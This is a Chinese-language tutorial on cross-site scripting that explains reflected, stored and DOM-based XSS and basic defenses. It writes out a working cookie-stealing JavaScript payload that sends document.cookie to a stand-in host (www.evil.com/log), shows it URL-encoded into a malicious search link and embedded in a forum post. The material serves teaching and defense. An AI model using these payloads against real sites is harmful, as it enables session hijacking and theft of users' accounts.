# Cross-site Scripting  跨站脚本攻击


<!-- TOC -->

- [Cross-site Scripting  跨站脚本攻击](#cross-site-scripting--跨站脚本攻击)
    - [基本原理](#基本原理)
    - [XSS 类型](#xss-类型)
    - [XSS Payload](#xss-payload)
        - [用于 Cookie 劫持的 Payload](#用于-cookie-劫持的-payload)
        - [如果进行反射型 XSS](#如果进行反射型-xss)
        - [如果进行存储型 XSS](#如果进行存储型-xss)
    - [防御手段](#防御手段)
    - [References](#references)

<!-- /TOC -->


## 基本原理
将可以加载脚本的代码（例如 `<script>`、`<img>` 等）注入到 DOM，实现加载恶意的脚本。


## XSS 类型
* 反射型 XSS
* 存储型 XSS
* DOM Based XSS


## XSS Payload
用以完成各种具体功能的恶意脚本，被称为 XSS Payload。XSS Payload 实际上就是 JS 脚本，或者其他 Flash 等富客户端脚本。

### 用于 Cookie 劫持的 Payload
1. payload 脚本  `http://www.evil.com/payload.js` 中有如下代码
    ```js
    var img = document.createElement('img');
    img.src = 'http://www.evil.com/log?' + encodeURIComponent(document.cookie);
    document.body.appendChild(img);
    ```
2. 只要上述代码在客户端被运行，则 `http://www.evil.com/log` 就可以获取到客户端的 cookie。
3. 下面通过反射型和存储型两种类型的 XSS 来运行 payload 脚本。

### 如果进行反射型 XSS
1. 输入信息时输入攻击性的 payload，或者诱导用户输入可以获取用户信息的 payload。
2. 假如网站 `www.foo.com` 的搜索功能有 XSS 漏洞，会把用户输入的内容直接添加到 DOM 中。
3. 例如用户通过在搜索框里输入 "你好"，会跳转到搜索结果页 `http://www.foo.com/search?word=%E4%BD%A0%E5%A5%BD`，并且页面上会显示："以下是 你好 的搜索结果"。
4. 这里假设网页直接把用户的输入内容添加到的 DOM 里而没有进行检查和编码。
5. 那么如果用户输入的是 "`<script>alert()</script>`"，在搜索结果页就会出现这个弹窗。
7. 同理，如果我们搜索 "`<script src="http://www.evil.com/payload.js"></script>`"，页面就会加载这个脚本。
7. 当然这个是我们自己搜索的，只会获得自己的 cookie。除非你诱导其他人搜索这么奇怪的一串字符。
8. 但是可以看到，如果直接访问 `http://www.foo.com/search?word=%E4%BD%A0%E5%A5%BD`，其实是和搜索 "你好" 一样的效果。所以，可以把 `<script src="http://www.evil.com/payload.js"></script>` 编码为 `%3Cscript%20src%3D%22http%3A%2F%2Fwww.evil.com%2Fpayload.js%22%3E%3C%2Fscript%3E`，在拼装出搜索结果页的 URL `http://www.foo.com/search?word=%3Cscript%20src%3D%22http%3A%2F%2Fwww.evil.com%2Fpayload.js%22%3E%3C%2Fscript%3E`。
9. 现在，只要诱导用户跳转到这个链接，就可以在搜索结果页加载 payload 脚本。
10. 如果当前用户此时在该网站为登录状态且保存了 cookie，则该 cookie 就会被 `payload.js` 发送到 `http://www.evil.com/log`。

### 如果进行存储型 XSS
1. 把 payload 直接存储到被攻击网站的页面中，诱导用户访问。
2. 假如网站 `www.foo.com` 的论坛有 XSS 漏洞，会将用户发帖中的 HTML 标签直接添加进 DOM 从而变得可执行。  
3. 直接把 `payload.js` 中的代码放在 `<script>` 标签里作为帖子内容的一部分发出去
    ```html
    <script>
    var img = document.createElement('img');
    img.src = 'http://www.evil.com/log?' + encodeURIComponent(document.cookie);
    document.body.appendChild(img);
    </script>
    ```
4. 只要有用户进入这个帖子，上述脚本就会获取用户的 cookie 并发送。


## 防御手段
1. 从上面的攻击可以看到，攻击显示注入恶意脚本，然后通过脚本进行破坏或者获取用户信息。
2. 因此防御手段可以从这两方面进行，也就是阻止恶意脚本注入，以及在注入后阻止破坏或获取用户用户信息。
3. 阻止注入的方式有两种：
    * 输入检查，过滤或者转码有危害的输入。
    * `X-XSS-Protection` 响应首部，浏览器会自动进行阻止。
4. 阻止获取用户 cookie 可以设置 `HttpOnly` cookie，这样会阻止通过脚本读取该 cookie。


## References
* [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
* [白帽子讲Web安全](https://book.douban.com/subject/10546925/)
* <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">WASP</a>
